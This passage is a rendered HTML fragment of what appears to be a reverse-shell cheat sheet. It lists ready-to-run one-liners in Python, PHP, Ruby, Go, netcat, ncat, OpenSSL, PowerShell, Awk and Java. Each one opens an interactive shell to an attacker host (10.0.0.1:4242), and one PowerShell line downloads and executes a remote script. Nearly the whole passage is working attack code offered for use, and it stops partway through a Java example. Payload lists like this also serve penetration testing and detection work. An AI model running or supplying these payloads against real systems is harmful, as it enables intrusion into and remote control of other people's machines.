+</span></span></code></pre></div><p>IPv4 (No Spaces)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;socket=__import__(&#34;socket&#34;);os=__import__(&#34;os&#34;);pty=__import__(&#34;pty&#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;socket=__import__(&#34;socket&#34;);subprocess=__import__(&#34;subprocess&#34;);os=__import__(&#34;os&#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;socket=__import__(&#34;socket&#34;);subprocess=__import__(&#34;subprocess&#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#39;</span>
+</span></span></code></pre></div><p>IPv4 (No Spaces, Shortened)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;a=__import__;s=a(&#34;socket&#34;);o=a(&#34;os&#34;).dup2;p=a(&#34;pty&#34;).spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((&#34;10.0.0.1&#34;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&#34;/bin/sh&#34;)&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;a=__import__;b=a(&#34;socket&#34;);p=a(&#34;subprocess&#34;).call;o=a(&#34;os&#34;).dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;a=__import__;b=a(&#34;socket&#34;);c=a(&#34;subprocess&#34;).call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;c([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=f(),stdout=f(),stderr=f())&#39;</span>
+</span></span></code></pre></div><p>IPv4 (No Spaces, Shortened Further)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;a=__import__;s=a(&#34;socket&#34;).socket;o=a(&#34;os&#34;).dup2;p=a(&#34;pty&#34;).spawn;c=s();c.connect((&#34;10.0.0.1&#34;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&#34;/bin/sh&#34;)&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;a=__import__;b=a(&#34;socket&#34;).socket;p=a(&#34;subprocess&#34;).call;o=a(&#34;os&#34;).dup2;s=b();s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;a=__import__;b=a(&#34;socket&#34;).socket;c=a(&#34;subprocess&#34;).call;s=b();s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;c([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=f(),stdout=f(),stderr=f())&#39;</span>
+</span></span></code></pre></div><p>IPv6</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+</span></span></code></pre></div><p>IPv6 (No Spaces)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;socket=__import__(&#34;socket&#34;);os=__import__(&#34;os&#34;);pty=__import__(&#34;pty&#34;);s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+</span></span></code></pre></div><p>IPv6 (No Spaces, Shortened)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;a=__import__;c=a(&#34;socket&#34;);o=a(&#34;os&#34;).dup2;p=a(&#34;pty&#34;).spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(&#34;/bin/sh&#34;)&#39;</span>
+</span></span></code></pre></div><p>Windows only (Python2)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python.exe -c <span style="color:#e6db74">&#34;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;10.0.0.1&#39;, 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(&#39;try&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;\\windows\\system32\\cmd.exe&#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&#34;</span>
+</span></span></code></pre></div><p>Windows only (Python3)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python.exe -c <span style="color:#e6db74">&#34;import socket,os,threading,subprocess as sp;p=sp.Popen([&#39;cmd.exe&#39;],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((&#39;10.0.0.1&#39;,4242));threading.Thread(target=exec,args=(\&#34;</span><span style="color:#66d9ef">while</span>(True)<span style="color:#960050;background-color:#1e0010">:</span>o=os.read(p.stdout.fileno(),<span style="color:#ae81ff">1024</span>);s.send(o)\<span style="color:#e6db74">&#34;,globals()),daemon=True).start();threading.Thread(target=exec,args=(\&#34;</span><span style="color:#66d9ef">while</span>(True)<span style="color:#960050;background-color:#1e0010">:</span>i=s.recv(<span style="color:#ae81ff">1024</span>);os.write(p.stdin.fileno(),i)\<span style="color:#e6db74">&#34;,globals())).start()&#34;</span>
+</span></span></code></pre></div><h3 id="php">
+  PHP
+  <a class="anchor" href="#php">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</span></span><span style="display:flex;"><span>php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);shell_exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</span></span><span style="display:flex;"><span>php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#39;</span>
+</span></span><span style="display:flex;"><span>php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);system(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</span></span><span style="display:flex;"><span>php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);passthru(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</span></span><span style="display:flex;"><span>php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);popen(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;, &#34;r&#34;);&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;</span>
+</span></span></code></pre></div><h3 id="ruby">
+  Ruby
+  <a class="anchor" href="#ruby">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>ruby <span style="color:#f92672">-</span>rsocket <span style="color:#f92672">-</span>e<span style="color:#e6db74">&#39;f=TCPSocket.open(&#34;10.0.0.1&#34;,4242).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ruby <span style="color:#f92672">-</span>rsocket <span style="color:#f92672">-</span>e<span style="color:#e6db74">&#39;exit if fork;c=TCPSocket.new(&#34;10.0.0.1&#34;,&#34;4242&#34;);loop{c.gets.chomp!;(exit! if $_==&#34;exit&#34;);($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts &#34;failed: #{$_}&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">NOTE</span>: <span style="color:#66d9ef">Windows</span> only
+</span></span><span style="display:flex;"><span>ruby <span style="color:#f92672">-</span>rsocket <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;c=TCPSocket.new(&#34;10.0.0.1&#34;,&#34;4242&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;</span>
+</span></span></code></pre></div><h3 id="golang">
+  Golang
+  <a class="anchor" href="#golang">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;package main;import&#34;os/exec&#34;;import&#34;net&#34;;func main(){c,_:=net.Dial(&#34;tcp&#34;,&#34;10.0.0.1:4242&#34;);cmd:=exec.Command(&#34;/bin/sh&#34;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}&#39;</span> &gt; /tmp/t.go <span style="color:#f92672">&amp;&amp;</span> go run /tmp/t.go <span style="color:#f92672">&amp;&amp;</span> rm /tmp/t.go
+</span></span></code></pre></div><h3 id="netcat-traditional">
+  Netcat Traditional
+  <a class="anchor" href="#netcat-traditional">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -e /bin/sh 10.0.0.1 <span style="color:#ae81ff">4242</span>
+</span></span><span style="display:flex;"><span>nc -e /bin/bash 10.0.0.1 <span style="color:#ae81ff">4242</span>
+</span></span><span style="display:flex;"><span>nc -c bash 10.0.0.1 <span style="color:#ae81ff">4242</span>
+</span></span></code></pre></div><h3 id="netcat-openbsd">
+  Netcat OpenBsd
+  <a class="anchor" href="#netcat-openbsd">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 <span style="color:#ae81ff">4242</span> &gt;/tmp/f
+</span></span></code></pre></div><h3 id="netcat-busybox">
+  Netcat BusyBox
+  <a class="anchor" href="#netcat-busybox">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 <span style="color:#ae81ff">4242</span> &gt;/tmp/f
+</span></span></code></pre></div><h3 id="ncat">
+  Ncat
+  <a class="anchor" href="#ncat">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ncat 10.0.0.1 <span style="color:#ae81ff">4242</span> -e /bin/bash
+</span></span><span style="display:flex;"><span>ncat --udp 10.0.0.1 <span style="color:#ae81ff">4242</span> -e /bin/bash
+</span></span></code></pre></div><h3 id="openssl">
+  OpenSSL
+  <a class="anchor" href="#openssl">#</a>
+</h3>
+<p>Attacker:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>user@attack$ openssl req -x509 -newkey rsa<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">4096</span> -keyout key.pem -out cert.pem -days <span style="color:#ae81ff">365</span> -nodes
+</span></span><span style="display:flex;"><span>user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port <span style="color:#ae81ff">4242</span>
+</span></span><span style="display:flex;"><span>or
+</span></span><span style="display:flex;"><span>user@attack$ ncat --ssl -vv -l -p <span style="color:#ae81ff">4242</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>user@victim$ mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s <span style="color:#ae81ff">2</span>&gt;&amp;<span style="color:#ae81ff">1</span> | openssl s_client -quiet -connect <span style="color:#ae81ff">10.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">4242</span> &gt; /tmp/s; rm /tmp/s
+</span></span></code></pre></div><p>TLS-PSK (does not rely on PKI or self-signed certificates)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># generate 384-bit PSK</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># use the generated string as a value for the two PSK variables from below</span>
+</span></span><span style="display:flex;"><span>openssl rand -hex <span style="color:#ae81ff">48</span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># server (attacker)</span>
+</span></span><span style="display:flex;"><span>export LHOST<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*&#34;</span>; export LPORT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;4242&#34;</span>; export PSK<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;replacewithgeneratedpskfromabove&#34;</span>; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># client (victim)</span>
+</span></span><span style="display:flex;"><span>export RHOST<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10.0.0.1&#34;</span>; export RPORT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;4242&#34;</span>; export PSK<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;replacewithgeneratedpskfromabove&#34;</span>; export PIPE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/tmp/`openssl rand -hex 4`&#34;</span>; mkfifo $PIPE; /bin/sh -i &lt; $PIPE 2&gt;&amp;<span style="color:#ae81ff">1</span> | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT &gt; $PIPE; rm $PIPE
+</span></span></code></pre></div><h3 id="powershell">
+  Powershell
+  <a class="anchor" href="#powershell">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(<span style="color:#e6db74">&#34;10.0.0.1&#34;</span>,<span style="color:#ae81ff">4242</span>);$stream = $client.GetStream();[<span style="color:#66d9ef">byte[]</span>]$bytes = <span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">.65535</span>|%{<span style="color:#ae81ff">0</span>};<span style="color:#66d9ef">while</span>(($i = $stream.Read($bytes, <span style="color:#ae81ff">0</span>, $bytes.Length)) <span style="color:#f92672">-ne</span> <span style="color:#ae81ff">0</span>){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,<span style="color:#ae81ff">0</span>, $i);$sendback = (iex $data <span style="color:#ae81ff">2</span>&gt;&amp;<span style="color:#ae81ff">1</span> | Out-String );$sendback2  = $sendback + <span style="color:#e6db74">&#34;PS &#34;</span> + (pwd).Path + <span style="color:#e6db74">&#34;&gt; &#34;</span>;$sendbyte = ([<span style="color:#66d9ef">text.encoding</span>]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,<span style="color:#ae81ff">0</span>,$sendbyte.Length);$stream.Flush()};$client.Close()
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell -nop -c <span style="color:#e6db74">&#34;</span>$client<span style="color:#e6db74"> = New-Object System.Net.Sockets.TCPClient(&#39;10.0.0.1&#39;,4242);</span>$stream<span style="color:#e6db74"> = </span>$client<span style="color:#e6db74">.GetStream();[byte[]]</span>$bytes<span style="color:#e6db74"> = 0..65535|%{0};while((</span>$i<span style="color:#e6db74"> = </span>$stream<span style="color:#e6db74">.Read(</span>$bytes<span style="color:#e6db74">, 0, </span>$bytes<span style="color:#e6db74">.Length)) -ne 0){;</span>$data<span style="color:#e6db74"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span>$bytes<span style="color:#e6db74">,0, </span>$i<span style="color:#e6db74">);</span>$sendback<span style="color:#e6db74"> = (iex </span>$data<span style="color:#e6db74"> 2&gt;&amp;1 | Out-String );</span>$sendback2<span style="color:#e6db74"> = </span>$sendback<span style="color:#e6db74"> + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;</span>$sendbyte<span style="color:#e6db74"> = ([text.encoding]::ASCII).GetBytes(</span>$sendback2<span style="color:#e6db74">);</span>$stream<span style="color:#e6db74">.Write(</span>$sendbyte<span style="color:#e6db74">,0,</span>$sendbyte<span style="color:#e6db74">.Length);</span>$stream<span style="color:#e6db74">.Flush()};</span>$client<span style="color:#e6db74">.Close()&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell IEX (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#39;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#39;</span>)
+</span></span></code></pre></div><h3 id="awk">
+  Awk
+  <a class="anchor" href="#awk">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>awk <span style="color:#e6db74">&#39;BEGIN {s = &#34;/inet/tcp/0/10.0.0.1/4242&#34;; while(42) { do{ printf &#34;shell&gt;&#34; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &#34;exit&#34;) close(s); }}&#39;</span> /dev/null
+</span></span></code></pre></div><h3 id="java">
+  Java
+  <a class="anchor" href="#java">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Runtime r <span style="color:#f92672">=</span> Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>Process p <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash -c &#39;exec 5&lt;&gt;/dev/tcp/10.0.0.1/4242;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#39;&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span><span style="color:#a6e22e">waitFor</span><span style="color:#f92672">();</span>
+</span></span></code></pre></div><h4 id="java-alternative-1">
+  Java Alternative 1
+  <a class="anchor" href="#java-alternative-1">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>String host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;127.0.0.1&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> port<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>String cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cmd.exe&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>Process p<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ProcessBuilder<span style="color:#f92672">(</span>cmd<span style="color:#f92672">).</span><span style="color:#a6e22e">redirectErrorStream</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">).</span><span style="color:#a6e22e">start</span><span style="color:#f92672">();</span>Socket s<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> Socket<span style="color:#f92672">(</span>host<span style="color:#f92672">,</span>port<span style="color:#f92672">);</span>InputStream pi<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">(),</span>pe<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span><span style="color:#a6e22e">getErrorStream</span><span style="color:#f92672">(),</span> si<span style="color:#f92672">=</span>s<span style="color:#f92672">.</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">();</span>OutputStream po<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span><span style="color:#a6e22e">getOutputStream</span><span style="color:#f92672">(),</span>so<span style="color:#f92672">=</span>s<span style="color:#f92672">.</span><span style="color:#a6e22e">getOutputStream</span><span style="color:#f92672">();</span><span style="color:#66d9ef">while</span><span style="color:#f92672">(!</span>s<span style="color:#f92672">.</span><span style="color:#a6e22e">isClosed</span><span style="color:#f92672">()){</span><span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>pi<span style="color:#f92672">.</span><span style="color:#a6e22e">available</span><span style="color:#f92672">()&gt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672">)</span>so<span style="color:#f92672">.</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span>pi<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">());</span><span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>pe<span style="color:#f92672">.</span><span style="color:#a6e22e">available</span><span style="color:#f92672">()&gt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672">)</span>so<span style="color:#f92672">.</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span>pe<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">());</span><span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>si<span style="color:#f92672">.</span><span 